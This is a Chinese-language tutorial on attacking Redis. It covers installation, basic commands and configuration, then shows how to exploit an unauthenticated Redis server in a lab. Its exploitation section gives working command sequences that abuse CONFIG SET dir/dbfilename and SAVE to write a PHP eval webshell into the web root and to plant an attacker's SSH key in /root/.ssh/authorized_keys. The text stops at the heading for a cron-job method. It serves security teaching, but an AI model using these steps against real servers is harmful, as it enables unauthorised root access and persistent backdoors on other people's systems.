# Redis 攻击方式

Author: H3rmesk1t

Data: 2022.02.24

# Redis 简介
[Introduction to Redis](https://redis.io/topics/introduction), `Redis`是一个使用`ANSI C`编写的开源、支持网络、基于内存、分布式、可选持久性的键值对存储数据库.

作为一个`key-value`存储系统, `Redis`和`Memcached`类似, 但是它支持存储的`value`类型相对更多，包括`strings`, `hashes`, `lists`, `sets`, `sorted sets with range queries`, `bitmaps`, `hyperloglogs`, `geospatial indexes`和`streams`. 这些数据类型都可以进行原子操作, 支持`push`/`pop`、`add`/`remove`及取交集并集和差集及更丰富的操作. 在此基础上, `Redis`支持各种不同方式的排序. 为了保证效率, 数据都是缓存在内存中, 与`memcached`有区别的是, `Redis`会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件, 并且在此基础上实现了`master-slave`(主从)同步操作.

`Redis`运行在内存中但是可以持久化到磁盘, 所以在对不同数据集进行高速读写时需要权衡内存, 因为数据量不能大于硬件内存. 在内存数据库方面的另一个优点是: 相比在磁盘上相同的复杂的数据结构, 在内存中操作起来非常简单, 这样`Redis`可以做很多内部复杂性很强的事情. 同时, 在磁盘格式方面它们是紧凑的以追加的方式产生的, 因为它们并不需要进行随机访问.

# Redis 环境搭建
后续漏洞复现均利用`Kali-Linux`来进行演示. 先下载并安装`Redis`:

```bash
wget http://download.redis.io/releases/redis-6.2.5.tar.gz
tar -zxvf redis-6.2.5.tar.gz
```

接着进入到解压好的`Redis`目录中, 通过`make`编译的方式来安装:

```bash
cd redis-6.2.5
make
```

当出现`Hint: It's a good idea to run 'make test'`字样时, 编译安装成功.

<div align=center><img src="./Redis%20攻击方式/1.png"></div>

编译安装结束后, 将`src/redis-server`和`src/redis-cli`拷贝到`/usr/bin`目录下(避免每次都进入安装目录启动`redis-server`和`redis-cli`):

```bash
sudo cp src/redis-server /usr/bin
sudo cp src/redis-cli /usr/bin
```

接着将`redis.conf`拷贝到`/etc`目录下:

```bash
sudo cp redis.conf /etc
```

最后使用`/etc/redis.conf`文件中的配置启动`redis`服务:

```bash
sudo redis-server /etc/redis.conf
```

<div align=center><img src="./Redis%20攻击方式/2.png"></div>

# Redis 基本用法
## redis-cli 命令
`Redis`命令用于在`redis`服务上执行操作, 要在`redis`服务上执行命令, 需要一个`redis`客户端, 在上文安装步骤时解压的安装包内含有该客户端.

本地执行命令时, 先启动`redis`客户端, 打开终端并输入命令`redis-cli`, 去连接本地的`redis`服务. 例如连接到本地的`redis`服务并执行`ping`命令(用于检测`redis`服务是否启动, 服务器运作正常的话, 会返回一个`PONG`字样:

```bash
redis-cli
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> 
```

远程服务执行命令时, 同样是使用`redis-cli`命令:

```bash
redis-cli -h 127.0.0.1 -p 6379 -a "20010728"
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> 
```

## SET 命令
`SET`命令用于设置给定`KEY`的值, 如果`KEY`已经存储其他值, `SET`就覆写旧值并且无视类型. `SET`命令基本语法如下:

```bash
SET KEY_NAME VALUE
```

## GET 命令
`GET`命令用于获取指定`KEY`的值, 如果`KEY`不存在, 则返回`nil`. `GET`命令基本语法如下:

```bash
GET KEY_NAME
```

## FLUSHALL 命令
`FLUSHALL`命令用于清空整个`Redis`服务器的数据(删除所有数据库的所有`KEY`). `FLUSHALL`命令基本语法如下:

```bash
FLUSHALL
```

## SAVE 命令
`SAVE`命令用于创建当前数据库的备份, `SAVE`命令执行一个同步保存操作, 将当前`Redis`实例的所有数据快照(snapshot)以默认`RDB`文件的形式保存到硬盘. `SAVE`命令基本语法如下:

```bash
SAVE
```

## CONFIG 命令
`CONFIG`命令用于恢复当前数据库的备份数据, 只需将备份文件(dump.rdb)移动到`redis`安装目录并启动服务即可. 获取`Redis`目录也可以使用`CONFIG`命令:

```bash
CONFIG GET dir
```

## Redis 配置
`Redis`的配置文件名为`redis.conf`(`Windows`下为`redis.windows.conf`), 通过`CONFIG`命令来查看或者设置配置项:

```bash
CONFIG GET *    // *为获取所有配置项, 这里也可以换成需要查看的配置项
```

<div align=center><img src="./Redis%20攻击方式/3.png"></div>

当需要编辑配置文件时, 可以通过修改`redis.conf`文件或使用`CONFIG set`命令来修改配置:

```bash
CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE
```

常见`redis.conf`配置项说明如下:

|配置项|说明|
|:----:|:----:|
|port: 6379|指定 Redis 监听端口, 默认端口为 6379|
|bind: 127.0.0.1 -::1|绑定的主机地址|
|timeout: 300|当客户端闲置多长秒后关闭连接, 指定为 0 时表示关闭该功能|
|databases: 16|设置数据库的数量, 默认数据库为 0, 可以使用 SELECT 命令在连接上指定数据库 id|
|save: <seconds> <changes>|指定在多长时间内, 有多少次更新操作, 就将数据同步到数据文件, 可以多个条件配合|
|dbfilename: dump.rdb|指定本地数据库文件名, 默认值为 dump.rdb|
|dir: ./|指定本地数据库存放目录|
|protected-mode: yes|关闭 protected-mode 模式, 此时外部网络可以直接访问; 开启 protected-mode 保护模式, 需配置 bind ip 或者设置访问密码|

## Redis 安全
可以通过`Redis`的配置文件设置密码参数, 这样做的好处在于, 当客户端连接到`Redis`服务时需要进行密码验证, 从而在一定程度上保证了`Redis`服务的安全性. 可以通过以下命令查看是否设置了密码验证, 默认情况下`requirepass`参数是空的, 无密码验证, 这就意味着无需通过密码验证就可以连接到`Redis`服务:

```bash
CONFIG get requirepass
```

可以通过`SET`命令来设置密码, 从而让客户端连接`Redis`时需要进行密码验证, 否则无法执行命令:

```bash
CONFIG set requirepass "20010728"
```

# Redis 未授权访问漏洞
## 基本概念
默认情况下, `Redis`会绑定在`0.0.0.0:6379`, 如果没有进行采用相关的策略(例如添加防火墙规则避免其他非信任来源`ip`进行访问等), 这样将会将`Redis`服务暴露在公网上. 当没有设置密码认证时, 会导致任意用户在可以访问目标服务器的情况下未授权访问`Redis`以及读取`Redis`的数据. 攻击者在未授权访问`Redis`的情况下, 可以利用`Redis`自身的提供的`CONFIG`命令向目标主机写`WebShell`、`SSH`公钥、创建计划任务反弹`Shell`等. 

利用思路: 
 - 先将`Redis`的本地数据库存放目录设置为`web`目录、`~/.ssh`目录或`/var/spool/cron`目录等, 然后将`dbfilename`(本地数据库文件名)设置为文件名你想要写入的文件名称, 最后再执行`SAVE`或`BGSAVE`进行保存即可.

利用条件: 
 - `Redis`绑定在`0.0.0.0:6379`且未进行添加防火墙规则避免非信任来源`IP`访问等相关安全保护操作, 而是直接暴露在公网上.
 - 未设置密码认证, 可以不使用密码远程登录`Redis`服务.
 - 关闭保护模式(设置`redis.conf`中的参数`protected-mode`的参数为`no`)

漏洞危害:
 - 攻击者无需认证就可以访问到内部数据, 可能导致敏感信息泄露, 或者执行`flushall`命令来清空所有数据.
 - 攻击者可通过`EVAL`执行`lua`代码, 或通过数据备份功能往磁盘写入后门文件.
 - 当`Redis`以`root`身份运行时, 攻击者可以给`root`账户写入`SSH`公钥文件, 从而直接通过`SSH`登录受害服务器.

## 漏洞演示
实验环境:
 - 攻击机Kali-Linux: 192.168.249.143
 - 受害机Kali-Linux: 192.168.249.145

`Redis.conf`配置:
 - 注释`bind 127.0.0.1 -::1`
 - 将`protected-mode yes`改成`protected-mode no`

<div align=center><img src="./Redis%20攻击方式/4.png"></div>

在攻击机上使用`Redis`客户端直接无账号成功登录受害机上的`Redis`服务端, 并且成功列出服务端`Redis`的信息:

```bash
redis-cli -h 192.168.249.145
```

<div align=center><img src="./Redis%20攻击方式/5.png"></div>

### 利用 Redis 写入 Webshell
利用条件:
 - 服务端的`Redis`连接存在未授权, 在攻击机上能用`redis-cli`直接登陆连接, 并未设置登陆验证.
 - 服务端存在开启的`Web`服务器, 并且知道`Web`目录的路径, 具有文件读写增删改查权限.

利用原理:
 - 在数据库中插入一条`Webshell`数据, 将此`Webshell`的代码作为`value`, `key`值随意, 然后通过修改数据库的默认路径为`/var/www/html`和默认的缓冲文件`shell.php`, 把缓冲的数据保存在文件里, 这样就可以在服务器端的`/var/www/html`目录下生成一个`Webshell`.

利用方式:
 - 将`dir`设置为`/var/www/html`目录, 将指定本地数据库存放目录设置为`/var/www/html`, 将`dbfilename`设置为文件名`shell.php`, 即指定本地数据库文件名为`shell.php`, 再执行`save`或`bgsave`, 则可以写入一个路径为`/var/www/html/shell.php`的`Webshell`文件.

操作步骤:

```bash
config set dir /var/www/html/ 
config set dbfilename shell.php
set xxx "\r\n\r\n<?php eval($_POST[h3]);?>\r\n\r\n"     // 用redis写入文件的会自带一些版本信息, 如果不换行可能会导致无法执行
save
```

<div align=center><img src="./Redis%20攻击方式/6.png"></div>

查看`/var/www/html`, 成功写入`Webshell`.

<div align=center><img src="./Redis%20攻击方式/7.png"></div>

<div align=center><img src="./Redis%20攻击方式/8.png"></div>

### 利用 Redis 写入 SSH 公钥
利用条件:
 - 服务端的`Redis`连接存在未授权, 在攻击机上能用`redis-cli`直接登陆连接, 并未设置登陆验证.
 - 服务端存在`.ssh`目录并且有写入的权限.

利用原理:
 - 在数据库中插入一条数据, 将本机的公钥作为`value`, `key`值随意, 然后通过修改数据库的默认路径为`/root/.ssh`和默认的缓冲文件`authorized.keys`, 把缓冲的数据保存在文件里, 这样就可以在服务器端的`/root/.ssh`下生成一个授权的`key`.

操作步骤:

 - 安装`openssh`服务.
```bash
# 安装 openssh 服务
sudo apt-get install openssh-server
# 启动 ssh 服务
sudo /etc/init.d/ssh start
# 配置 root 用户连接权限
sudo mousepad /etc/ssh/sshd_config
PermitRootLogin yes
# 设置允许通过免密登录
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
# 重启 ssh 服务
sudo /etc/init.d/ssh restart
```

<div align=center><img src="./Redis%20攻击方式/9.png"></div>


 - 在攻击机的`/root/.ssh`目录里生成`ssh`公钥`key`:
```bash
# 生成 rsa 密钥
ssh-keygen -t rsa
```

 - 将公钥导入`key.txt`文件(前后用`\n`换行, 避免和`Redis`里其他缓存数据混合), 再把`key.txt`文件内容写入服务端`Redis`的缓冲里:

```bash
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt
cat /root/.ssh/key.txt | redis-cli -h 192.168.249.145 -x set xxx    // -x 代表从标准输入读取数据作为该命令的最后一个参数。
```

 - 使用攻击机连接目标机器`Redis`, 设置`Redis`的备份路径为`/root/.ssh`, 保存文件名为`authorized_keys`, 并将数据保存在目标服务器硬盘上:

```bash
redis-cli -h 192.168.249.145
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

 - 使用攻击机`ssh`连接目标受害机即可:

```bash
ssh 192.168.249.145
```

<div align=center><img src="./Redis%20攻击方式/10.png"></div>

### 利用 Redis 写入计划任务